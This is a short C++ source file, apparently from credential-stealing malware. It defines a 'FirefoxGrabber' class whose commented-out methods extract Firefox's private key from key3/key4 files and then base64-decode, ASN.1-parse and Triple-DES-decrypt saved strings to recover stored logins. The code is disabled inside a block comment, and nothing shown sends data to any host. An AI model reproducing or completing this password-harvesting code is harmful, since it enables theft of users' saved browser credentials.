#include "Common.h"

/*
void FirefoxGrabber::ProcessKey(string fileName, bool isKey3)
{
	vector<byte> temp;
	if (isKey3)
		temp = FireFoxBase().ExtractPrivateKey3(fileName);
	else
		temp = FireFoxBase().ExtractPrivateKey4(fileName);
	if (!temp.empty()) key.push_back(temp);
}

string FirefoxGrabber::DecryptStr(string str)
{
	vector<byte> bStr;
	string s = base64_decode(str);
	for (size_t i = 0; i < s.size(); ++i)
		bStr.push_back(s[i]);
	Asn1DerObject obj = Asn1Der().Parse(bStr);

	string result;
	if (!obj.objects.empty() && obj.objects[0].objects.size() >= 2)
	{
		for (size_t i = 0; i < key.size(); i++)
		{
			result = FireFoxBase().TripleDesDecrypt(key[i], obj.objects[0].objects[1].objects[1].Data, obj.objects[0].objects[2].Data);
			if (!result.empty())
				return result;
		}
	}

	return result;
}

bool FirefoxGrabber::IsSuccess()
{
	return !key.empty();
} */